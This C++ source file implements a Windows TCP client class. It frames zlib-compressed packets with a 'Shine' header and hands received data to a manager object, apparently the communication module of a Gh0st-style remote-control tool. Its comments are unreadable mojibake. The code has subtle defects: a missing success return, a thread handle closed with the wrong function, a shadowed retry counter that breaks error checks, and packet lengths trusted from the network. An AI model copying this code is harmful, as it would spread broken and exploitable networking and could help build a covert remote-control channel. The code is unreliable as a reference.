#include "_IOCPClient.h"


_CIOCPClient::_CIOCPClient()
{
	//��ʼ���׽������
	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0)
	{
		return;
	}
	
	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
	m_IsReceiving = TRUE;
	

}
_CIOCPClient::~_CIOCPClient()
{
	//������Դ
	//�ر�ͨѶ�׽���
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}
	//�رչ����߳̾��
	if (m_WorkThreadHandle != WSA_INVALID_EVENT)
	{
		WSACloseEvent(m_WorkThreadHandle);
		m_WorkThreadHandle = WSA_INVALID_EVENT;
	}
	//�ر��¼�
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = INVALID_HANDLE_VALUE;
	}

	WSACleanup();

}
BOOL  _CIOCPClient::ConnectServer(char* ServerIPAddress, USHORT  ServerConnectPort)
{
	//����һ��ͨ���׽���
	m_ClientSocket = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return  FALSE;
	}
	//����sockaddr_in�ṹҲ���� Server��IPAddress�ṹ
	sockaddr_in  ServerAddress;
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_port = htons(ServerConnectPort);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIPAddress);

	//���ӷ�����
	if (connect(m_ClientSocket, (SOCKADDR *)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return  FALSE;
	}
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);
}
DWORD WINAPI  _CIOCPClient::WorkThreadProcedure(LPVOID  ParameterData)
{
	_CIOCPClient* This = (_CIOCPClient*)ParameterData;

	//�����׽��ּ���
	fd_set  OldSocketSet;
	fd_set  NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);

	char  BufferData[PACKET_LENGTH] = { 0 };            //���������ڴ�
	//ѡ��ģ��
	//������ͨѶ�׽��ַ��뵽������
	FD_SET(This->m_ClientSocket, &OldSocketSet);
	while (This->IsReceiving())
	{
		NewSocketSet = OldSocketSet;
		//���������û�����ݷ��Ϳͻ��ˣ���������select������
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);
		if (IsOk == SOCKET_ERROR)     //������������
		{
			This->Disconnect();
			printf("IsReceiving  �ر�\r\n");
			break;
		}
		if (IsOk > 0)
		{
			//���ź�
			memset(BufferData, 0, sizeof(BufferData));
			//�������ض˷���������
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);
			if (BufferLength <= 0)
			{
				printf("���ض˹ر�����\r\n");
				This->Disconnect();
				break;
			}
			if (BufferLength > 0)
			{
				This->OnReceiving((char*)BufferData, BufferLength);
			}
		}
	}
	return 0;
}
void   _CIOCPClient::OnReceiving(char* BufferData, ULONG  BufferLength)
{
	//�ӵ������ݽ��н�ѹ��
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();
			return;
		}
		//�����ܵ������ݴ洢��m_ReceivedCompressedBufferData
		m_ReceivedCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);
		//��������Ƿ��������ͷ��С����������ǾͲ�����ȷ������
		while (m_ReceivedCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			//�洢���ݰ�ͷ����־
			char  v1[PACKET_FLAG_LENGTH] = { 0 };
			//�������ݰ�ͷ����־
			CopyMemory(v1, m_ReceivedCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//У�����ݰ�ͷ����־
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw"Bad Buffer";
			}
			//��ȡ���ݰ��ܴ�С
			ULONG   PackTotalLength = 0;
			CopyMemory(&PackTotalLength,
				m_ReceivedCompressedBufferData.GetArray(PACKET_FLAG_LENGTH), sizeof(ULONG));

			int a = m_ReceivedCompressedBufferData.GetArrayLength();
			if (PackTotalLength && a >= PackTotalLength)
			{
				//��ʼ���ݰ�  [shine][ѹ���ĳ���+13][û��ѹ���ĳ���][HelloWorld..]
				ULONG  DecompressedLength = 0;               //û��ѹ���ĳ���

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);
				//[ѹ���ĳ���+13][û��ѹ���ĳ���][HelloWorld..]

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));
				//[û��ѹ���ĳ���][HelloWorld..]

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&DecompressedLength, sizeof(ULONG));
				//[HelloWorld..]

				ULONG  CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				//ѹ������
				PBYTE  CompressedData = new BYTE[CompressedLength];               //û�н�ѹ���ݳ���
																				  //��ѹ����
				PBYTE  DeCompressedData = new  BYTE[DecompressedLength];
				if (CompressedData == NULL || DeCompressedData == NULL)
				{
					throw" Bad Allocate";
				}
				//�����ݰ��ж�ȡѹ���������
				m_ReceivedCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				//��ѹ��
				int IsOk = uncompress(DeCompressedData, &DecompressedLength, CompressedData, CompressedLength);
				if (IsOk == Z_OK)
				{
					m_ReceivedDecompressedBufferData.ClearArray();
					m_ReceivedCompressedBufferData.ClearArray();
					//������ʵ����
					m_ReceivedDecompressedBufferData.WriteArray(DeCompressedData, DecompressedLength);
					delete[] CompressedData;
					delete[] DeCompressedData;

					//��������
					m_ManagerObject->HandleIO((PBYTE)m_ReceivedDecompressedBufferData.GetArray(0),
						m_ReceivedDecompressedBufferData.GetArrayLength());

				}
				else
				{
					delete[] CompressedData;
					delete[] DeCompressedData;
					throw"Bad Buffer";
				}
			}
			else
			{
				break;
			}
		}
	}
	catch (...)
	{
		m_ReceivedDecompressedBufferData.ClearArray();
		m_ReceivedCompressedBufferData.ClearArray();
	}
	return ;
}
void   _CIOCPClient::Disconnect()
{
	//ȡ���ڵ�ǰ�����ϵ��첽����
	CancelIo((HANDLE)m_ClientSocket);
	//֪ͨ�����߳��˳����ź�
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);
	closesocket(m_ClientSocket);
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}
int    _CIOCPClient::OnSending(char* BufferData, ULONG  BufferLength)
{
	m_SendCompressedBufferData.ClearArray();
	if (BufferLength > 0)
	{
		unsigned  long  ComprssedLength = (double)BufferLength*1.001 + 12;
		LPBYTE          CompressedData = new  BYTE[ComprssedLength];
		if (CompressedData == NULL)
		{
			return  0;
		}
		int  IsOk = compress(CompressedData, &ComprssedLength, (PBYTE)BufferData, BufferLength);
		//��ѹ��ʧ��
		if (IsOk != Z_OK)
		{
			delete[]  CompressedData;
			return FALSE;
		}
		//�������ݰ��ܳ�
		ULONG  PackTotalLength = ComprssedLength + PACKET_HEADER_LENGTH;
		//�����ݰ���д������

		m_SendCompressedBufferData.WriteArray((PBYTE)m_PacketHeaderFlag, sizeof(m_PacketHeaderFlag));
		//[Shine]

		m_SendCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
		//[Shine][PackTotalLength]

		m_SendCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
		//[Shine][PackTotalLength][BufferLength]

		m_SendCompressedBufferData.WriteArray(CompressedData, ComprssedLength);
		//[Shine][PackTotalLength][BufferLength][ѹ�������ʵ����]

		delete[]  CompressedData;
		CompressedData = NULL;
	}
	//�ֶη�������
	return  SendWithSplit((char*)m_SendCompressedBufferData.GetArray(),
		m_SendCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
BOOL   _CIOCPClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	int  ReturnLength = 0;
	const char* Travel = (char*)BufferData;
	int i = 0;
	ULONG  Sended = 0;
	ULONG  SendRetry = 15;
	int   j = 0;
	for (i = BufferLength; i >= SplitLength; i -= SplitLength)
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += SplitLength;
		Travel += ReturnLength;
		Sleep(15);
	}
	if (i > 0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, i, 0);
			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;
	}
	if (Sended == BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}